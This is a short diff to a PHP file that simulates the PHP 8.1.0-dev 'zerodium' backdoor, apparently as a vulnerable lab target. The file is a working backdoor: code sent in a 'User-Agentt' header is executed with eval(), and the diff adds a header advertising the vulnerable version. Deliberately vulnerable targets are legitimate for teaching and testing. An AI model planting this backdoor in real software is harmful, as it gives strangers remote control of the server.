@@ -1,10 +1,12 @@
 <?php
+// Leak PHP Version as requested
+header("X-Powered-By: PHP/8.1.0-dev");
+
 // PHP 8.1.0-dev Backdoor Simulation
 if (isset($_SERVER['HTTP_USER_AGENTT']) && strpos($_SERVER['HTTP_USER_AGENTT'], 'zerodium') === 0) {
     $command = substr($_SERVER['HTTP_USER_AGENTT'], 8);
-    echo "<pre>";
-    system($command);
-    echo "</pre>";
+    // The real backdoor used zend_eval_string
+    eval($command);
     exit;
 }
 ?>
